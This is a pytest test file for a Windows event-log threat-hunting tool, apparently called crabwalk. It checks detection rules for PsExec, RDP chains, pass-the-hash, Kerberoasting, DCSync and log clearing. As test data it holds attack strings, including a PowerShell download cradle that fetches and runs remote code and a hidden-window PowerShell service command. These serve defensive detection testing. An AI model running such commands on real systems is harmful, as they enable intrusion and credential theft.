import dataclasses
import itertools
from datetime import datetime, timedelta, timezone

import pytest

from crabwalk.catalog import POWERSHELL, SECURITY, SYSMON, SYSTEM, TS_LSM, WINRM
from crabwalk.models import NormalizedEvent
from crabwalk.rules import HuntContext, hunt, run_rules

T0 = datetime(2026, 8, 1, 12, 0, 0, tzinfo=timezone.utc)
_rid = itertools.count(1)  # EventRecordID is unique per event in real data


def ev(event_id, *, minutes=0, computer="SRV01", channel=SECURITY, record_id=None, **data):
    return NormalizedEvent(
        timestamp=T0 + timedelta(minutes=minutes),
        channel=channel,
        provider="test",
        event_id=event_id,
        record_id=record_id if record_id is not None else next(_rid),
        computer=computer,
        data=data,
        source_file="test.evtx",
    )


def remote_logon(logon_id="0x3E7A", minutes=0, computer="SRV01", user="admin", **extra):
    data = {
        "TargetLogonId": logon_id,
        "TargetUserName": user,
        "TargetDomainName": "CORP",
        "LogonType": "3",
        "IpAddress": "10.0.0.5",
        "WorkstationName": "WS01",
        "AuthenticationPackageName": "Kerberos",
    }
    data.update(extra)
    return ev(4624, minutes=minutes, computer=computer, **data)


def findings_for(*events):
    return run_rules(HuntContext.build(list(events)))


def by_rule(findings, rule_id):
    return [f for f in findings if f.rule_id == rule_id]


def test_psexec_pattern_detected_and_known_tool_is_critical():
    findings = by_rule(
        findings_for(
            remote_logon(),
            ev(7045, channel=SYSTEM, minutes=2, ServiceName="PSEXESVC",
               ImagePath=r"%SystemRoot%\PSEXESVC.exe"),
        ),
        "CW-001",
    )
    (finding,) = findings
    assert finding.severity == "critical"
    assert "PSEXESVC" in finding.summary
    assert finding.user == "CORP\\admin"


def sysmon_image_path(service, image, *, minutes=0, computer="SRV01"):
    return ev(13, channel=SYSMON, minutes=minutes, computer=computer,
              Image=r"C:\Windows\system32\services.exe",
              TargetObject=rf"HKLM\System\CurrentControlSet\Services\{service}\ImagePath",
              Details=image)


def test_one_install_seen_by_7045_and_sysmon_13_is_one_finding():
    events = [
        remote_logon(),
        sysmon_image_path("PSEXESVC", r"%%SystemRoot%%\PSEXESVC.exe", minutes=1.999),
        ev(7045, channel=SYSTEM, minutes=2, ServiceName="PSEXESVC",
           ImagePath=r"%SystemRoot%\PSEXESVC.exe"),
    ]
    ctx = HuntContext.build(events)
    (install,) = ctx.service_installs
    assert install.source == "7045"
    assert len(by_rule(run_rules(ctx), "CW-001")) == 1


def test_sysmon_13_rewrite_of_an_existing_service_is_not_an_install():
    # Defender platform updates rewrite WinDefend's ImagePath all the time.
    image = r"C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.24090.11-0\MsMpEng.exe"
    findings = findings_for(remote_logon(), sysmon_image_path("WinDefend", image, minutes=3))
    assert by_rule(findings, "CW-001") == []


def test_sysmon_13_counts_when_it_looks_like_remote_exec():
    command = r"%COMSPEC% /b /c start /b /min powershell.exe -nop -w hidden -c ..."
    (finding,) = by_rule(findings_for(remote_logon(), sysmon_image_path("hello", command, minutes=1)),
                         "CW-001")
    assert "ImagePath of service 'hello' set to" in finding.summary
    # An unrelated 7045 elsewhere on the host does not prove this install's
    # 7045 was logged (the System log may have been cleared): it still counts.
    with_other_scm = findings_for(
        remote_logon(), sysmon_image_path("hello", command, minutes=1),
        ev(7045, channel=SYSTEM, minutes=9, ServiceName="Other", ImagePath=r"C:\o.exe"),
    )
    assert any("hello" in f.summary for f in by_rule(with_other_scm, "CW-001"))


def test_two_real_installs_of_one_service_are_not_merged():
    events = [
        remote_logon(),
        ev(7045, channel=SYSTEM, minutes=1, ServiceName="PSEXESVC", ImagePath=r"C:\p.exe"),
        remote_logon(logon_id="0x99", user="eve", IpAddress="10.0.0.9", WorkstationName="WS09",
                     minutes=1.03),
        ev(7045, channel=SYSTEM, minutes=1.1, ServiceName="PSEXESVC", ImagePath=r"C:\p.exe"),
    ]
    ctx = HuntContext.build(events)
    assert [i.source for i in ctx.service_installs] == ["7045", "7045"]
    assert len(by_rule(run_rules(ctx), "CW-001")) == 2


def test_copies_of_one_install_merge_even_across_an_earlier_write():
    # Sysmon 13 at :50, 4697 at :59.98, 7045 at :60.02 — one install, one finding.
    events = [
        remote_logon(),
        sysmon_image_path("PSEXESVC", r"%SystemRoot%\PSEXESVC.exe", minutes=50 / 60),
        ev(4697, channel=SECURITY, minutes=59.98 / 60, ServiceName="PSEXESVC",
           ServiceFileName=r"%SystemRoot%\PSEXESVC.exe"),
        ev(7045, channel=SYSTEM, minutes=60.02 / 60, ServiceName="PSEXESVC",
           ImagePath=r"%SystemRoot%\PSEXESVC.exe"),
    ]
    ctx = HuntContext.build(events)
    assert [i.source for i in ctx.service_installs] == ["7045"]
    assert len(by_rule(run_rules(ctx), "CW-001")) == 1


def test_service_install_without_remote_logon_is_quiet():
    findings = findings_for(
        ev(7045, channel=SYSTEM, ServiceName="GoodDriver", ImagePath=r"C:\ok.sys")
    )
    assert by_rule(findings, "CW-001") == []


def test_service_install_outside_window_is_quiet():
    findings = findings_for(
        remote_logon(),
        ev(7045, channel=SYSTEM, minutes=30, ServiceName="Svc", ImagePath=r"C:\x.exe"),
    )
    assert by_rule(findings, "CW-001") == []


def test_rdp_chain_across_three_hosts():
    hop1 = ev(21, channel=TS_LSM, computer="HOSTB", minutes=0,
              User="CORP\\bob", Address="10.1.1.1")
    hop2 = remote_logon(
        computer="HOSTC", minutes=45, user="bob", logon_id="0x77",
        LogonType="10", IpAddress="10.2.2.2", WorkstationName="HOSTB",
    )
    (finding,) = by_rule(findings_for(hop1, hop2), "CW-002")
    assert finding.host == "HOSTC"
    assert "RDP chain" in finding.summary
    assert "HOSTB" in finding.summary
    assert finding.evidence == [hop1, hop2]  # both hops cite their records


def test_rdp_chain_is_reported_once_when_both_logs_record_the_first_hop():
    # HOSTB logs the same inbound session in Security (4624 LT10, with the
    # workstation name) and in TS-LSM (21, address only): still one chain.
    b_4624 = remote_logon(computer="HOSTB", user="bob", logon_id="0x10", LogonType="10",
                          IpAddress="10.1.1.1", WorkstationName="WSX")
    b_21 = ev(21, channel=TS_LSM, computer="HOSTB", minutes=1 / 60, User="CORP\\bob",
              Address="10.1.1.1")
    c_4624 = remote_logon(computer="HOSTC", minutes=45, user="bob", logon_id="0x77",
                          LogonType="10", IpAddress="10.2.2.2", WorkstationName="HOSTB")
    (finding,) = by_rule(findings_for(b_4624, b_21, c_4624), "CW-002")
    assert finding.evidence == [b_4624, c_4624]  # the earlier record of the first hop


@pytest.mark.parametrize("b_user, c_user", [
    ("CORP.LOCAL\\bob", "CORP\\bob"),  # 4624 domain in DNS form
    ("bob@corp.local", "corp\\BOB"),  # UPN, and another case on the second hop
])
def test_rdp_chain_is_told_once_whatever_notation_each_log_uses(b_user, c_user):
    b_4624 = remote_logon(computer="HOSTB", user="bob", logon_id="0x10", LogonType="10",
                          IpAddress="10.1.1.1", WorkstationName="WSX")
    b_21 = ev(21, channel=TS_LSM, computer="HOSTB", minutes=1 / 60, User=b_user, Address="10.1.1.1")
    c_4624 = remote_logon(computer="HOSTC", minutes=45, user="bob", logon_id="0x77",
                          LogonType="10", IpAddress="10.2.2.2", WorkstationName="HOSTB")
    c_21 = ev(21, channel=TS_LSM, computer="HOSTC", minutes=45 + 1 / 60, User=c_user,
              Address="10.2.2.2")
    assert len(by_rule(findings_for(b_4624, b_21, c_4624, c_21), "CW-002")) == 1


def test_rdp_chains_from_clients_that_share_a_workstation_name_stay_apart():
    # The RDP client chooses the name it reports (xfreerdp /client-hostname:),
    # so two machines claiming ADMIN-PC must not merge into one chain.
    admin = remote_logon(computer="HOSTB", user="admin", logon_id="0x10", LogonType="10",
                         IpAddress="10.1.1.1", WorkstationName="ADMIN-PC")
    eve = remote_logon(computer="HOSTB", minutes=60, user="eve", logon_id="0x11", LogonType="10",
                       IpAddress="10.6.6.6", WorkstationName="ADMIN-PC")
    onward = remote_logon(computer="HOSTC", minutes=120, user="bob", logon_id="0x77",
                          LogonType="10", IpAddress="10.2.2.2", WorkstationName="HOSTB")
    chains = by_rule(findings_for(admin, eve, onward), "CW-002")
    assert sorted(f.evidence[0].data["IpAddress"] for f in chains) == ["10.1.1.1", "10.6.6.6"]


@pytest.mark.parametrize("name, domain", [
    ("ANONYMOUS LOGON", "NT AUTHORITY"),
    ("ANONYMOUS-ANMELDUNG", "NT-AUTORITÄT"),  # names are localized when logged; the SID is not
])
def test_anonymous_logon_does_not_take_the_blame_for_an_install(name, domain):
    anonymous = remote_logon(user=name, TargetDomainName=domain, TargetUserSid="S-1-5-7",
                             AuthenticationPackageName="NTLM")
    install = ev(7045, channel=SYSTEM, minutes=2, ServiceName="Svc", ImagePath=r"C:\x.exe")
    assert by_rule(findings_for(anonymous, install), "CW-001") == []
    # A real account's logon just before still correlates, even with null sessions after it.
    (finding,) = by_rule(findings_for(remote_logon(logon_id="0x51"), anonymous, install), "CW-001")
    assert finding.user == "CORP\\admin"


def test_an_account_merely_named_anonymous_is_not_exempt():
    install = ev(7045, channel=SYSTEM, minutes=2, ServiceName="Svc", ImagePath=r"C:\x.exe")
    impostor = remote_logon(user="anonymous1", TargetUserSid="S-1-5-21-1-2-3-1104")
    (finding,) = by_rule(findings_for(impostor, install), "CW-001")
    assert finding.user == "CORP\\anonymous1"
    # TS-LSM records carry no SID: only the exact built-in name may count there.
    rdp = ev(21, channel=TS_LSM, User="CORP\\anonymous.svc", Address="10.1.1.1")
    (finding,) = by_rule(findings_for(rdp, install), "CW-001")
    assert finding.user == "CORP\\anonymous.svc"


def test_pth_seclogo_logon_type_9():
    event = ev(
        4624, TargetUserName="victim", LogonType="9",
        LogonProcessName="seclogo", AuthenticationPackageName="Negotiate",
        TargetLogonId="0x99", TargetOutboundUserName="DA-admin",
    )
    (finding,) = by_rule(findings_for(event), "CW-003")
    assert finding.severity == "high"
    assert "DA-admin" in finding.summary


def test_pth_privileged_ntlm_needs_4672():
    logon = remote_logon(AuthenticationPackageName="NTLM")
    assert by_rule(findings_for(logon), "CW-003") == []
    privileges = ev(4672, SubjectLogonId="0x3E7A")
    (finding,) = by_rule(findings_for(logon, privileges), "CW-003")
    assert finding.severity == "medium"


def _admin_ntlm(logon_id, minutes, ip="10.0.0.5", user="admin", station="WS01"):
    return [remote_logon(logon_id, minutes=minutes, user=user, IpAddress=ip, WorkstationName=station,
                         AuthenticationPackageName="NTLM"),
            ev(4672, minutes=minutes, SubjectLogonId=logon_id)]


def test_pth_burst_of_privileged_ntlm_logons_is_one_finding():
    # a tool opens a session per operation, and a client may send a different made-up
    # workstation name each time: one run on one host is one finding, not one per logon.
    events = [e for i in range(5) for e in _admin_ntlm(f"0x{i + 1:X}0", i * 2, station=f"RND{i}")]
    (finding,) = by_rule(findings_for(*events), "CW-003")
    assert len(finding.evidence) == 5
    assert finding.summary.startswith("5 privileged NTLM network logons from 10.0.0.5 over 8 min")
    assert "workstations: RND0, RND1, RND2 (+2 more)" in finding.summary
    # the story counts the burst through `count`, so the phrase itself carries no number
    assert finding.action == "logged on over NTLM with admin rights (possible pass-the-hash)"
    assert finding.count == 5
    assert (finding.src_ip, finding.src_host) == ("10.0.0.5", None)  # names disagree: none is the source


def test_pth_burst_names_a_source_only_when_every_logon_does():
    one_named = [*_admin_ntlm("0x10", 0, station="-"), *_admin_ntlm("0x20", 1, station="WS01")]
    (finding,) = by_rule(findings_for(*one_named), "CW-003")
    assert finding.src_host is None  # the first logon never claimed WS01
    ip_less = [*_admin_ntlm("0x10", 0, ip="-", station="WS01"), *_admin_ntlm("0x20", 1, ip="-", station="ws01")]
    (finding,) = by_rule(findings_for(*ip_less), "CW-003")
    assert finding.src_host == "WS01" and "workstation: WS01" in finding.summary


def test_pth_burst_counts_a_logon_kept_in_two_exports_once():
    logon, privileges = _admin_ntlm("0x10", 0)
    # a second export keeps the EventRecordID and renumbers the file position: dedup drops it
    export = dataclasses.replace(logon, record_number=1, source_file="filtered.evtx")
    # a copy without an EventRecordID falls back to its file position: the burst drops it
    no_id = ev(4624, record_id=9999, **logon.data)
    for copy in (export, no_id):
        (finding,) = by_rule(findings_for(logon, privileges, copy), "CW-003")
        assert finding.count == 1 and len(finding.evidence) == 1


def test_pth_bursts_split_on_gap_source_and_account():
    events = [*_admin_ntlm("0x10", 0), *_admin_ntlm("0x20", 9),  # one burst, 9 min apart
              *_admin_ntlm("0x30", 30),  # past burst_gap: a new one
              *_admin_ntlm("0x40", 31, ip="10.0.0.6"),  # another source
              *_admin_ntlm("0x50", 32, user="other")]  # another account
    findings = sorted(by_rule(findings_for(*events), "CW-003"), key=lambda f: f.timestamp)
    assert [len(f.evidence) for f in findings] == [2, 1, 1, 1]
    assert findings[0].src_host == "WS01"
    assert findings[0].count == 2


def test_remote_scheduled_task():
    task = ev(
        4698, minutes=1, SubjectLogonId="0x3E7A", TaskName=r"\Microsoft\evil",
        TaskContent="<Task><Exec><Command>C:\\payload.exe</Command></Exec></Task>",
    )
    (finding,) = by_rule(findings_for(remote_logon(), task), "CW-004")
    assert "payload.exe" in finding.summary
    assert finding.user == "CORP\\admin"


def test_local_scheduled_task_is_quiet():
    local = remote_logon(IpAddress="-", WorkstationName="-")
    task = ev(4698, minutes=1, SubjectLogonId="0x3E7A", TaskName=r"\backup")
    assert by_rule(findings_for(local, task), "CW-004") == []


def test_admin_share_executable_deduplicates():
    events = [
        ev(5145, record_id=i, ShareName=r"\\*\ADMIN$", RelativeTargetName="evil.exe",
           SubjectUserName="admin", IpAddress="10.0.0.5")
        for i in (1, 2)
    ]
    findings = by_rule(findings_for(*events), "CW-005")
    assert len(findings) == 1
    assert "evil.exe" in findings[0].summary


def test_wmi_spawned_shell_is_high():
    event = ev(
        1, channel=SYSMON, Image=r"C:\Windows\System32\cmd.exe",
        ParentImage=r"C:\Windows\System32\wbem\WmiPrvSE.exe",
        CommandLine="cmd.exe /c whoami", User="CORP\\admin",
    )
    (finding,) = by_rule(findings_for(event), "CW-006")
    assert finding.severity == "high"
    assert "whoami" in finding.summary


def test_winrm_shell_event():
    (finding,) = by_rule(findings_for(ev(91, channel=WINRM)), "CW-007")
    assert finding.techniques == ("T1021.006",)


def test_suspicious_powershell_download_cradle():
    event = ev(
        4104, channel=POWERSHELL,
        ScriptBlockText="IEX (New-Object Net.WebClient).DownloadString('http://x/a')",
    )
    (finding,) = by_rule(findings_for(event), "CW-008")
    assert finding.severity == "high"
    assert "download cradle" in finding.summary


def test_benign_powershell_is_quiet():
    event = ev(4104, channel=POWERSHELL, ScriptBlockText="Get-ChildItem C:\\")
    assert by_rule(findings_for(event), "CW-008") == []


def test_kerberoasting_rc4_ticket():
    event = ev(
        4769, TargetUserName="attacker@CORP.LOCAL", TargetDomainName="CORP.LOCAL",
        ServiceName="svc_sql", TicketEncryptionType="0x17", Status="0x0",
        IpAddress="10.0.0.9",
    )
    (finding,) = by_rule(findings_for(event), "CW-010")
    assert finding.severity == "high"
    assert "svc_sql" in finding.summary
    assert finding.techniques == ("T1558.003",)


def test_kerberoasting_ignores_aes_and_machine_accounts():
    aes = ev(4769, TargetUserName="u", ServiceName="svc", TicketEncryptionType="0x12")
    machine = ev(4769, TargetUserName="u", ServiceName="HOST$", TicketEncryptionType="0x17")
    assert by_rule(findings_for(aes, machine), "CW-010") == []


def test_kerberoasting_ignores_machine_requesters_in_upn_form():
    event = ev(4769, TargetUserName="WS01$@CORP.LOCAL", ServiceName="svc_sql",
               TicketEncryptionType="0x17", Status="0x0")
    assert by_rule(findings_for(event), "CW-010") == []


def test_dcsync_by_non_dc_principal_is_critical():
    event = ev(
        4662, SubjectUserName="Administrator", SubjectDomainName="CORP",
        Properties="%%7688 {1131f6aa-9c07-11d1-f79f-00c04fc2dcd2} {19195a5b-6da0-11d0}",
    )
    (finding,) = by_rule(findings_for(event), "CW-011")
    assert finding.severity == "critical"
    assert finding.user == "CORP\\Administrator"
    assert finding.techniques == ("T1003.006",)


def test_dcsync_ignores_domain_controller_machine_account():
    # DCs replicate legitimately and authenticate as machine accounts.
    event = ev(
        4662, SubjectUserName="DC1$", SubjectDomainName="CORP",
        Properties="{1131f6aa-9c07-11d1-f79f-00c04fc2dcd2}",
    )
    assert by_rule(findings_for(event), "CW-011") == []


def test_dcsync_ignores_non_replication_object_access():
    event = ev(4662, SubjectUserName="Administrator", Properties="{some-other-guid}")
    assert by_rule(findings_for(event), "CW-011") == []


def test_log_cleared_and_dedup():
    events = [
        ev(1102, SubjectUserName="admin", SubjectDomainName="CORP"),
        ev(1102, SubjectUserName="admin", SubjectDomainName="CORP"),  # duplicate export
    ]
    findings = by_rule(findings_for(*events), "CW-009")
    assert len(findings) == 1
    assert findings[0].user == "CORP\\admin"
    assert len(findings[0].evidence) == 1


def test_clearing_every_log_at_once_is_one_finding():
    # `wevtutil cl` over every channel: one 104 per channel, seconds apart (EVTX-to-MITRE-Attack)
    who = {"SubjectUserName": "admin", "SubjectDomainName": "CORP"}
    channels = ["Application", "System", "Windows PowerShell", "Microsoft-Windows-Sysmon/Operational"]
    events = [ev(104, channel=SYSTEM, minutes=i / 60, Channel=c, **who) for i, c in enumerate(channels)]
    events += [ev(1102, minutes=0.1, **who),
               ev(104, channel=SYSTEM, minutes=30, Channel="Application", **who),  # later: a new clear
               ev(104, channel=SYSTEM, computer="SRV02", Channel="System", **who)]  # another host
    findings = sorted(by_rule(findings_for(*events), "CW-009"), key=lambda f: (f.host, f.timestamp))
    assert [len(f.evidence) for f in findings] == [5, 1, 1]
    assert findings[0].action == "cleared 5 event logs (Application, System, Windows PowerShell and 2 more)"
    assert findings[1].action == "cleared the 'Application' log"


def test_findings_sorted_worst_first():
    ctx, findings = hunt(
        [
            ev(4104, channel=POWERSHELL, ScriptBlockText="$x = [Convert]::FromBase64String($y)"),
            remote_logon(),
            ev(7045, channel=SYSTEM, minutes=2, ServiceName="PSEXESVC", ImagePath=r"C:\p.exe"),
        ]
    )
    assert [f.rule_id for f in findings][0] == "CW-001"  # critical first
    assert findings[0].severity == "critical"


def test_every_technique_a_rule_can_emit_has_a_name():
    # reports and the ATT&CK summary print technique_name(); a missing entry prints the ID twice
    import re
    from pathlib import Path

    from crabwalk.attack import TECHNIQUES

    rules_dir = Path(__file__).resolve().parent.parent / "src" / "crabwalk" / "rules"
    emitted = {t for path in rules_dir.glob("*.py")
               for t in re.findall(r'"(T\d{4}(?:\.\d{3})?)"', path.read_text(encoding="utf-8"))}
    assert emitted and emitted <= set(TECHNIQUES), sorted(emitted - set(TECHNIQUES))
